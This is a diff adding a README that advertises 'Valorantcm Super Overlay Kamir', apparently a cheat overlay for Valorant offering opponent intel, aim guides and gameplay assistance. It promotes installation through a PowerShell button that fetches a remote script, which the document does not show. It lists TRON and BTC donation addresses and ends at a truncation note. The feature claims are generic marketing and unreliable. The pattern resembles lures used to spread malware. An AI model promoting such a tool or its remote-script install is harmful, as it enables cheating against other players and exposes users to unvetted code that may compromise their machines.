@@ -1,0 +1,100 @@
+🔥 Valorantcm Super Overlay Kamir — Game Enhancer for Windows 10/11
+
+🔌 PowerShell Setup Button
+
+Keep the project growing
+
+TRON:&nbsp;TXe5nEEQePKQoUCPJ5jVhtGep7pYJHa8B5 | BTC:&nbsp;1GjXn2cLq9EshfcqAbj7duR3Ba9NGiDXEs
+
+Valorantcm Super Overlay Kamir is built for players who want sharper in-game awareness without touching the core experience. It delivers real-time information overlays and gameplay assistance that surface the details that matter mid-match, so you can react faster and play with more confidence. Everything stays focused on clean, readable overlays and practical assistance rather than unnecessary overhauls. If you want an edge that keeps the game intact and your attention where it belongs, this overlay does exactly that.
+
+✅ Before You Start
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+Features
+
+- Real-time tactical overlay — draws live info directly over the game so you keep your eyes on the fight instead of alt-tabbing.
+- Player and team intel — surfaces rank, agent, and match context at a glance, so you know who you're up against before the first shot.
+- Crosshair and HUD assistance — configurable on-screen aids that sharpen aim reference and keep critical readouts visible.
+- Configurable layout — move, resize, and toggle every element so the overlay fits your resolution and playstyle.
+- Lightweight footprint — built to run alongside the game without dragging down frames.
+- Instant toggles — hotkey control to show, hide, or lock the overlay mid-match.
+- Match-aware updates — information refreshes as the game state changes, keeping overlays current rather than stale.
+- Preset profiles — save and switch setups for different agents or modes without reconfiguring from scratch.
+
+How it works
+
+Valorantcm Super Overlay Kamir runs as a lightweight companion layer that reads the game state and surfaces exactly what you need, right when you need it. No guesswork, no tabbing out, no downtime between rounds.
+
+It hooks into the match flow and renders a transparent, always-on-top overlay that sits cleanly over gameplay without stealing input or focus. Information updates in real time, so what you see reflects the current round, economy, and situational context.
+
+Gameplay assistance is handled through in-context prompts and indicators — you get the reads, cues, and decision support pushed to the edge of your screen instead of buried in menus. Everything is designed to keep your eyes on the action, with overlays positioned and sized to stay out of the way.
+
+Information overlays deliver live data panels: match stats, round history, player context, and configurable readouts that can be toggled on or off per element. You choose what shows, where it shows, and how loud it is visually — the defaults are tuned to stay minimal until you want more.
+
+The overlay is fully configurable at runtime, so you can dial in layouts, opacity, and which modules are active without restarting the game. Changes apply on the fly, letting you adapt between matches or on the fly.
+
+Under the hood, it stays decoupled from core game files: the project only reads and displays, never modifies gameplay logic or assets. That keeps the footprint small and the behavior predictable, so the overlay enhances what's already there instead of rewriting it.
+
+Modules and Settings
+
+Overlay HUD Layout Module
+Establishes the base overlay layer that all other ValorantCM-super-overlay-kamir modules are drawn onto, so users have a single movable frame to organize.
+- Screen Position lets the user drag the overlay to any area of the game view and lock it in place once satisfied.
+- Scale adjusts the overall size of overlay content so it stays readable across different resolutions and viewing distances.
+- Opacity controls how strongly the overlay appears against the game, helping keep gameplay visuals visible underneath.
+
+Match Information Panels Module
+Displays match-related information panels inside the overlay and lets users decide which ones are active at any time.
+- Panel Visibility toggles individual information panels on or off so only relevant data is shown.
+- Panel Order arranges the sequence in which active panels are stacked within the overlay.
+- Panel Placement positions each panel independently within the overlay frame to fit the user's layout.
+
+Visual Timers and Indicators Module
+Adds countdown timers and state-based indicators to the overlay for tracking recurring in-game intervals at a glance.
+- Indicator Style changes the visual form of each timer or indicator to match the user's preference.
+- Indicator Placement sets where each timer sits within the overlay so it does not cover key game areas.
+- Indicator Appearance adjusts color and size so timers remain legible while counting down or changing state on screen.
+
+Crosshair and Aim Guide Overlays Module
+Draws optional crosshair and aim guide elements on top of the game view as a persistent aiming reference.
+- Guide Style selects the shape and form of the crosshair or aim guide elements.
+- Color and Size settings tune the guide's visibility against different backgrounds and display setups.
+- Spacing adjusts the gap or arrangement of guide components so the reference matches the user's aiming preferences.
+
+Color and Theme Controls Module
+Applies a consistent visual theme across every overlay component and keeps elements distinguishable in varied in-game environments.
+- Per-Component Colors let users assign separate palettes to panels, timers and guides.
+- Contrast controls strengthen the difference between overlay elements and the game view beneath them.
+- Theme Selection applies a coordinated palette to all modules at once, with changes reflected immediately in the overlay.
+
+Profile Presets Module
+Saves complete overlay configurations as presets so users can move between play styles or display setups in one step.
+- Save Preset captures the current layout, visibility and style settings as a named configuration.
+- Load Preset restores a saved configuration, including panel arrangement, timers and guide settings.
+- Preset Management lets users keep multiple configurations on hand and choose the one that fits the current session.
+
+Presets tie the other modules together: a saved profile carries the HUD layout, panel choices, timer and guide styling, and theme into a single switchable state, so restoring a preset reconfigures the entire overlay rather than one module at a time. Hotkeys then act on that configured state, letting users cycle visibility or swap what is displayed without opening any settings while a match is running.
+
+Additional Settings
+- Hotkey Assignment lets users bind keys for showing, hiding or cycling overlay elements, chosen to avoid conflicts with in-game bindings.
+- Startup Behavior controls whether the overlay launches with a saved preset or resumes the last used configuration.
+- Session State Review shows the current overlay configuration so users can confirm settings before or during play.
+- Module Master Toggle enables or disables individual modules globally, useful when a user wants only part of the overlay active.
+
+Usage Scenarios
+
+Scenario 1: A Ranked Player Building a Minimal In-Match Information Layout
+
+Goal: Keep only the essential timers and a compact crosshair visible during ranked matches, without extra panels crowding the game view.
+
+Steps:
+1. Open the Overlay HUD Layout module and drag the overlay to a corner of the game view, then set Scale and Opacity so the content stays readable without covering key areas.
+2. In the Match Information Panels module, use Panel Visibility to turn off panels that are not needed and keep the remaining ones in one small stack with Panel Order.
+3. Add a timer in the Visual Timers and Indicators module, choose an Indicator Style and Placement away from the center of the screen, then adjust its Appearance for legibility.
+
+…（内容已截断）
